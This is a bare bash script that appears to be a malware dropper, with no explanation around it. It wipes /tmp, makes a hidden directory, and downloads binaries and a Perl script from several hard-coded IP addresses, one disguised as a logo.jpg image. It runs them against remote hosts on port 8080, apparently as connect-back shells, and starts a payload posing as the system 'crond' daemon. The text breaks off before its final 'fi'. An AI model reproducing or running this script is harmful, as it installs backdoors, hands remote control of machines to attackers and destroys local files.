 


















































 #!/bin/bash
 cd /tmp
 rm -rf *
 rm -rf .*
 mkdir .sess_a4c1cb9ea15105441fb0366b06479082
 cd .sess_a4c1cb9ea15105441fb0366b06479082
 if [ -f cb ]; then
 chmod +x cb
 ./cb 200.31.193.67 8080 &
 else
 wget 203.222.141.147/studio/images/logo.jpg
 mv logo.jpg cb
 chmod +x cb
 ./cb 200.31.193.67 8080 &
 fi
 if [ -f ping.txt ]; then
 perl ping.txt 210.245.233.251 8080 &
 else
 curl -o ping.txt 81.58.26.26/libsh/ping.txt
 perl ping.txt 200.31.193.67 8080 &
 fi
 if [ -f crond ]; then
 rm -rf /tmp/chspsp*
 chmod +x crond
 export PATH="."
 crond
 else
 wget 193.77.126.41/images/crond
 chmod +x crond
 export PATH="."
 crond
 fi
 if [ -f crond ]; then
 chmod +x crond
 export PATH="."
 crond
 else
 curl -o crond 193.77.126.41/images/crond
 chmod +x crond
 export PATH="."
 crond
 
